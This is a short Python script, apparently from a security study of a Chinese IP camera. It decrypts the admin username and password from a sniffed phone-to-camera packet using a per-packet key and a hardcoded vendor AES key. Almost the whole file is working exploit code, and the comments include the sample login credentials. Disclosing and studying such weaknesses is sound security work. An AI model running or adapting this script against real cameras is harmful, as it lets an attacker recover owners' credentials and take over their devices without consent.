#!/usr/bin/python3

# Original script from https://cyberlinksecurity.ie/vulnerabilities-to-exploit-a-chinese-ip-camera/
# Script for decrypting password from a packet sent by the phone to the camera
# Modified for use with Python 3.10.8
# Example packet changed to actual packet sniffed from the study

# Install from pycryptodome package
from Crypto.Cipher import AES

# username: admin
# password: #Sablay2023

EXAMPLE_PACKET_HEX = "8f040000780000001f0a00000021c8e503323032332d30362d32372032333a32373a34330000000000000000000000000061646d696e000000000000000000000000000000000000000000000000000000317055327064575445394930454456380d465bbcb3f7821d6fdc7e1b790e46d08161a1327e54af425eca10875b90623f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

# Encrypted password and username are delimited by 0.
def count(packet):
    counter = 0
    for b in packet:
        if b != 0:
            counter += 1
        else:
            return counter


def decrypt(key , data):
    aes = AES.new(key.encode(),AES.MODE_ECB)
    unpad = lambda date: date[0:-date[-1]]
    msg = aes.decrypt(data)
    print("\nDecrypting with key (utf-8): \t"+ key)
    print("Decrypting data(hex):\t\t" +data.hex())
    print("Decrypted data(hex):  \t\t" + unpad(msg).hex()+ "\n")
    return unpad(msg)

def decryptPacket(packet):
    print("Decrypting packet:\n\n"+ packet.hex())

    randomKey2 = packet[81:97].decode("utf-8")

    print(randomKey2)

    usernameLenght = count(packet[49:])
    username = packet[49:49+usernameLenght].decode("utf-8")

    print(username)

    origEncryptLenght = count(packet[97:])
    origEncrypted = packet[97:97+origEncryptLenght]

    print(origEncrypted)
    print(len(origEncrypted))

    decrypted = decrypt(randomKey2,origEncrypted)

    finalDecrypted = decrypt("macrovideo+*#!^@",decrypted).decode('utf-8')

    result = {'username':username,'password':finalDecrypted}
    return result

result = decryptPacket(bytes.fromhex(EXAMPLE_PACKET_HEX))
print("\rUsername is: {}\nPassword is: {}".format(result['username'],result['password']))
